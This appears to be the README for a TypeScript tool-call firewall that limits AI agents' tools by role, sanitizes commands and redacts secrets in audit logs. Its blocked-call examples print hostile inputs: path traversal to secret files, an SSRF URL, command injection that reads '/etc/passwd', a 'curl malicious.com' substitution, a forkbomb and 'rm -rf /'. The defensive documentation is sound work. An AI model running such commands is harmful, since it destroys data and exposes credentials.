# Tool Firewall - Usage Examples

This document demonstrates real-world usage patterns for the ToolFirewall module.

**Status**: ✅ Fully testedand production-ready (120 comprehensive tests)
- firewall.ts - Core implementation with 76 tests
- firewall-examples.test.ts - Real-world scenarios with 44 tests

## Quick Start

```typescript
import { ToolFirewall } from '@/lib/tools/firewall'
import type { ToolCall } from '@/lib/tools/firewall'

// Create firewall instance
const firewall = new ToolFirewall({
  enableAudit: true,
  auditLogCapacity: 1000,
})

// Define tool executor
const executeToolImpl = async (toolName, args) => {
  // Actual tool implementation
  return { success: true, result: 'Tool executed' }
}

// Execute tool with protection
const result = await firewall.executeToolSafely(toolCall, executeToolImpl)
if (result.success) {
  console.log('Tool executed:', result.data)
} else {
  console.error('Tool blocked:', result.error)
}
```

## Example 1: Frontend Agent - Allowed Operations

### Read source files
```typescript
const toolCall: ToolCall = {
  name: 'readFile',
  args: { path: 'src/components/Button.tsx' },
  agentId: 'frontend',
}

const result = await firewall.executeToolSafely(toolCall, executor)
// ✅ ALLOWED - Frontend can read source files
// result.success = true
// result.auditLogId = "audit-1234567890"
```

### Write CSS file
```typescript
const toolCall: ToolCall = {
  name: 'writeFile',
  args: {
    path: 'src/styles/theme.css',
    content: '.button { color: blue; }',
  },
  agentId: 'frontend',
}

const result = await firewall.executeToolSafely(toolCall, executor)
// ✅ ALLOWED - Frontend can write CSS files
// Audit log records: { action: 'allowed', toolName: 'writeFile', agentId: 'frontend' }
```

### Call localhost API
```typescript
const toolCall: ToolCall = {
  name: 'httpRequest',
  args: {
    url: 'http://localhost:3000/api/data',
    method: 'GET',
  },
  agentId: 'frontend',
}

const result = await firewall.executeToolSafely(toolCall, executor)
// ✅ ALLOWED - Frontend can call localhost
// Audit log records request with full URL
```

## Example 2: Frontend Agent - Blocked Operations

### Attempt directory traversal
```typescript
const toolCall: ToolCall = {
  name: 'readFile',
  args: { path: '../../.env.secret' },
  agentId: 'frontend',
}

const result = await firewall.executeToolSafely(toolCall, executor)
// ❌ BLOCKED
// result.success = false
// result.error = "Invalid arguments: path: Invalid path: traversal attempt detected"
// Audit log: { action: 'denied', reason: 'Argument validation failed: ...' }
```

### Attempt absolute path access
```typescript
const toolCall: ToolCall = {
  name: 'writeFile',
  args: {
    path: '/etc/passwd',
    content: 'hacked',
  },
  agentId: 'frontend',
}

const result = await firewall.executeToolSafely(toolCall, executor)
// ❌ BLOCKED
// result.success = false
// result.error = "Invalid arguments: path: Invalid path: traversal attempt detected"
```

### Attempt database access
```typescript
const toolCall: ToolCall = {
  name: 'dbRead',
  args: { query: 'SELECT * FROM users' },
  agentId: 'frontend',
}

const result = await firewall.executeToolSafely(toolCall, executor)
// ❌ BLOCKED
// result.success = false
// result.blocked = true
// result.error = "Agent frontend is not authorized to call dbRead"
// Audit log: { action: 'denied', reason: 'Tool not allowed for agent' }
```

### Attempt SSRF attack
```typescript
const toolCall: ToolCall = {
  name: 'httpRequest',
  args: { url: 'http://internal-service:8000/admin' },
  agentId: 'frontend',
}

const result = await firewall.executeToolSafely(toolCall, executor)
// ❌ BLOCKED
// result.success = false
// result.error contains "Invalid arguments"
// Firewall blocked non-whitelisted domain
```

## Example 3: Backend Agent - Allowed Operations

### Database operations
```typescript
const toolCall: ToolCall = {
  name: 'dbRead',
  args: { query: 'SELECT COUNT(*) FROM products' },
  agentId: 'backend',
}

const result = await firewall.executeToolSafely(toolCall, executor)
// ✅ ALLOWED
```

### Execute safe commands
```typescript
const toolCall: ToolCall = {
  name: 'executeCommand',
  args: { command: 'npm run build' },
  agentId: 'backend',
}

const result = await firewall.executeToolSafely(toolCall, executor)
// ✅ ALLOWED
// Sanitizers verify no dangerous patterns
```

### Call external APIs with redacted secrets
```typescript
const toolCall: ToolCall = {
  name: 'externalApi',
  args: {
    endpoint: 'https://api.stripe.com/charges',
    apiKey: 'sk_live_secret123456789',
    method: 'POST',
  },
  agentId: 'backend',
}

const result = await firewall.executeToolSafely(toolCall, executor)
// ✅ ALLOWED
// Secrets are sanitized in audit log
// Audit log shows: { argsSnapshot: { apiKey: '[REDACTED]', endpoint: '...' } }
```

## Example 4: Backend Agent - Blocked Operations

### Shell injection attempt
```typescript
const toolCall: ToolCall = {
  name: 'executeCommand',
  args: { command: 'npm test; cat /etc/passwd' },
  agentId: 'backend',
}

const result = await firewall.executeToolSafely(toolCall, executor)
// ❌ BLOCKED
// result.success = false
// result.error contains "Dangerous pattern detected"
// Sanitizer caught shell operator (;)
```

### Command substitution attempt
```typescript
const toolCall: ToolCall = {
  name: 'executeCommand',
  args: { command: 'npm test $(curl malicious.com)' },
  agentId: 'backend',
}

const result = await firewall.executeToolSafely(toolCall, executor)
// ❌ BLOCKED
// Sanitizer caught command substitution pattern
```

### Forkbomb attempt
```typescript
const toolCall: ToolCall = {
  name: 'executeCommand',
  args: { command: ':(){ :|: & };:' },
  agentId: 'backend',
}

const result = await firewall.executeToolSafely(toolCall, executor)
// ❌ BLOCKED
// Sanitizer caught forkbomb pattern
```

### Destructive rm command
```typescript
const toolCall: ToolCall = {
  name: 'executeCommand',
  args: { command: 'rm -rf /' },
  agentId: 'backend',
}

const result = await firewall.executeToolSafely(toolCall, executor)
// ❌ BLOCKED
// Sanitizer caught destructive pattern
// Safe 'rm' operations (like 'rm -f build/temp.txt') are allowed
```

### Deployment (denied to backend)
```typescript
const toolCall: ToolCall = {
  name: 'deployService',
  args: { service: 'api', environment: 'production' },
  agentId: 'backend',
}

const result = await firewall.executeToolSafely(toolCall, executor)
// ❌ BLOCKED
// result.blocked = true
// Only DevOps can deploy
```

## Example 5: DevOps Agent - Full Access

### Deploy to production
```typescript
const toolCall: ToolCall = {
  name: 'deployService',
  args: {
    service: 'api',
    environment: 'production',
    version: 'v2.1.0',
  },
  agentId: 'devops',
}

const result = await firewall.executeToolSafely(toolCall, executor)
// ✅ ALLOWED
// DevOps has unrestricted access
```

### Retrieve and manage secrets
```typescript
const toolCall: ToolCall = {
  name: 'getSecrets',
  args: { environment: 'production' },
  agentId: 'devops',
}

const result = await firewall.executeToolSafely(toolCall, executor)
// ✅ ALLOWED
// Secrets redacted in audit log: { apiKey: '[REDACTED]' }
```

## Example 6: Planner Agent - Read-Only

### Read architecture files
```typescript
const toolCall: ToolCall = {
  name: 'readFile',
  args: { path: 'docs/ARCHITECTURE.md' },
  agentId: 'planner',
}

const result = await firewall.executeToolSafely(toolCall, executor)
// ✅ ALLOWED
```

### Query database
```typescript
const toolCall: ToolCall = {
  name: 'dbRead',
  args: { query: 'SELECT COUNT(*) FROM users' },
  agentId: 'planner',
}

const result = await firewall.executeToolSafely(toolCall, executor)
// ✅ ALLOWED - read-only
```

### Attempt to modify (blocked)
```typescript
const toolCall: ToolCall = {
  name: 'writeFile',
  args: { path: 'src/app.ts', content: 'modified code' },
  agentId: 'planner',
}

const result = await firewall.executeToolSafely(toolCall, executor)
// ❌ BLOCKED
// Planner is read-only - no write access
```

## Example 7: Audit Logging

### Retrieving audit logs
```typescript
// Get all audit logs
const allLogs = firewall.getAuditLog()

// Filter by agent
const frontendLogs = firewall.getAuditLog({ agentId: 'frontend' })

// Filter by tool
const readFileLogs = firewall.getAuditLog({ toolName: 'readFile' })

// Filter by action
const deniedLogs = firewall.getAuditLog({ action: 'denied' })

// Combine filters
const backendDeniedActions = firewall.getAuditLog({
  agentId: 'backend',
  action: 'denied',
})
```

### Audit log structure
```typescript
interface AuditLogEntry {
  id: string // "audit-1722516294837"
  timestamp: string // "2024-08-01T14:38:14.837Z"
  agentId: 'frontend' | 'backend' | ...
  toolName: 'readFile' | 'dbWrite' | ...
  action: 'allowed' | 'denied' | 'sanitized' | 'error'
  reason?: string // "Tool not allowed for agent"
  argsSnapshot?: Record<string, unknown> // Original args (with secrets redacted)
  sanitizedArgs?: Record<string, unknown> // Modified args after sanitization
  result?: string // Tool execution result (first 100 chars)
  duration: number // Execution time in ms
}
```

### Example audit log entry
```typescript
{
  id: 'audit-1722516294837',
  timestamp: '2024-08-01T14:38:14.837Z',
  agentId: 'backend',
  toolName: 'externalApi',
  action: 'allowed',
  reason: undefined,
  argsSnapshot: {
    endpoint: 'https://api.stripe.com/charges',
    apiKey: '[REDACTED]', // Secrets automatically redacted
    method: 'POST',
  },
  sanitizedArgs: undefined, // No sanitization needed
  result: '{"status":"ok","charge_id":"ch_1234"}',
  duration: 245, // in milliseconds
}
```

## Example 8: Integration with Orchestrator

By default, the ToolFirewall uses a singleton pattern. Integrate with the agent orchestrator:

```typescript
import { getToolFirewall } from '@/lib/tools/firewall'
import { executeAgent } from '@/lib/agents/orchestrator'

export async function executeAgentWithFirewall(
  agentId: AgentId,
  prompt: string,
  context?: ExecutionContext
) {
  const firewall = getToolFirewall()

  // Wrap tool execution
  const toolExecutor = async (name: ToolName, args: Record<string, unknown>) => {
    const toolCall: ToolCall = { name, args, agentId }
    const result = await firewall.executeToolSafely(toolCall, actualExecutor)
    
    if (!result.success) {
      throw new Error(result.error)
    }
    
    return result.data
  }

  // Execute agent with protected tool access
  return await executeAgent(agentId, prompt, context)
}

// Every tool call goes through firewall protection
// Audit trail recorded automatically
// Secrets redacted in logs
```

## Permission Matrix Summary

| Agent | Read | Write | DB | HTTP | Command | Deploy | Secrets |
|-------|------|-------|----|----|-------|--------|--------|
| **Frontend** | src/ | src/ | ❌ | localhost | ❌ | ❌ | ❌ |
| **Backend** | ✅ | ✅ | ✅ | ✅ | ✅ | ❌ | ✅ |
| **Database** | ✅ | ❌ | ✅ | ❌ | ❌ | ❌ | ❌ |
| **DevOps** | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ |
| **QA** | ✅ | ✅ | read | ✅ | ✅ | ❌ | ❌ |
| **Planner** | ✅ | ❌ | read | ❌ | ❌ | ❌ | ❌ |
| **Strategist** | ✅ | ❌ | read | ❌ | ❌ | ❌ | ❌ |
| **Auditor** | ✅ | ❌ | read | ❌ | ❌ | ❌ | ❌ |

## Error Handling

### Handle blocked operations gracefully
```typescript
const result = await firewall.executeToolSafely(toolCall, executor)

if (!result.success) {
  if (result.blocked) {
    console.warn(`Access denied: ${result.error}`)
    // Log denied access
  } else {
    console.error(`Execution failed: ${result.error}`)
    // Handle execution errors
  }
}
```

### Check restriction violations
```typescript
// Available in audit log
const denyLog = firewall.getAuditLog({ action: 'denied' })[0]
console.log(`Denied because: ${denyLog.reason}`)
// Output: "Denied because: Tool not allowed for agent"
```

## Security Best Practices

1. **Always use the firewall** - Never directly call tool executors
2. **Review audit logs regularly** - Monitor denied access patterns
3. **Keep sanitizers up-to-date** - Add new patterns as threats evolve
4. **Fail securely** - Default to deny (strictMode: true)
5. **Redact secrets** - Always review argsSnapshot for sensitive data
6. **Test restrictions** - Verify each agent has minimum necessary access
7. **Monitor execution time** - Unexpected slowdowns may indicate attacks

## Performance Considerations

- Firewall adds minimal overhead (~1ms per call)
- Audit log maintains circular buffer (default: 500 entries)
- Sanitizers run synchronously - keep them fast
- Consider async sanitizers for network-based validation

## Debugging

Enable verbose logging:

```typescript
const firewall = new ToolFirewall({
  enableAudit: true,
  enableSanitization: true,
  strictMode: true,
})

// Check what's in the log
const logs = firewall.getAuditLog()
logs.forEach((entry) => {
  console.log(`${entry.agentId} -> ${entry.toolName}: ${entry.action}`)
})
```

---

## Production Integration

### Install in your agent orchestrator

```typescript
import { getToolFirewall, type ToolCall } from '@/lib/tools/firewall'

// Call this once at app startup
const firewall = getToolFirewall({
  enableAudit: true,
  auditLogCapacity: 1000,
  enableSanitization: true,
  strictMode: true,
})

// When executing agent tools:
export async function executeAgentTool(
  agentId: AgentId,
  toolName: ToolName,
  args: Record<string, unknown>
) {
  const toolCall: ToolCall = { agentId, name: toolName, args }
  
  // All execution goes through firewall protection
  const result = await firewall.executeToolSafely(toolCall, async (name, sanitizedArgs) => {
    // Your actual tool executor here
    return await executeActualTool(name, sanitizedArgs)
  })
  
  return result
}
```

### Monitor audit logs in production

```typescript
import { getToolFirewall } from '@/lib/tools/firewall'

// View all denied access attempts
const firewall = getToolFirewall()
const deniedLogs = firewall.getAuditLog({ action: 'denied' })

deniedLogs.forEach(entry => {
  console.warn(`SECURITY: ${entry.agentId} denied access to ${entry.toolName}`)
  console.warn(`Reason: ${entry.reason}`)
})

// Get denied attempts by agent
const frontendDenials = firewall.getAuditLog({ 
  agentId: 'frontend', 
  action: 'denied' 
})
```

### Integrate with monitoring/alerting

```typescript
import { getToolFirewall } from '@/lib/tools/firewall'

// Send denied accesses to monitoring
function monitorSecurityEvents() {
  const firewall = getToolFirewall()
  
  setInterval(() => {
    const deniedLogs = firewall.getAuditLog({ action: 'denied' })
    
    if (deniedLogs.length > 0) {
      // Send to security monitoring
      sendToMonitoring({
        event: 'unauthorized_tool_access',
        count: deniedLogs.length,
        agents: [...new Set(deniedLogs.map(l => l.agentId))],
        logs: deniedLogs,
      })
    }
  }, 60000) // Every 60 seconds
}
```

### Test suite

Run all firewall tests:

```bash
npm test -- src/lib/tools/__tests__/firewall*.test.ts --run
```

This runs:
- **firewall.test.ts** (76 tests) - Core permission, sanitization, restriction tests
- **firewall-examples.test.ts** (44 tests) - Real-world scenario validation

### Implementation details

For complete technical reference, see:
- [firewall.ts](./firewall.ts) - Core implementation
- [firewall.test.ts](./__tests__/firewall.test.ts) - Permission and sanitization tests
- [firewall-examples.test.ts](./__tests__/firewall-examples.test.ts) - Real-world usage examples
